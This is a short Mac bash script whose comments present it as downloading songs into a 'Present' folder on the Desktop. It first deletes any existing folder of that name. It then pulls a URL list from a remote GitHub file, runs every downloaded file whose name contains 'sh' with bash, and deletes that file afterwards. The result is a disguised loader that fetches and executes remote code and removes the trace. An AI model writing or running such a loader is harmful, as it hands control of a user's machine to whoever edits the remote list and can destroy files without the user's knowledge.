#!/bin/bash -l
#Mac version

cd /Users/`whoami`/Desktop
rm -r Present
mkdir Present
cd Present

#get the song links 
curl https://raw.githubusercontent.com/SomeResources/SomeResources.github.io/master/index.txt 2>/dev/null > songlinks.txt

while IFS= read -r url; do
   echo curling $url
   name=`echo ${url##*\/} | sed 's/%20/ /g'`
   curl "$url" > "$name"  #download the song from the link

   if [[ $name = *sh* ]] #run a script
	then
    	bash $name
	rm $name
   fi

   if [[ $name = *zip* ]] #unzip a zip
	then
    	unzip $name
   fi

done <"songlinks.txt"

rm "songlinks.txt"
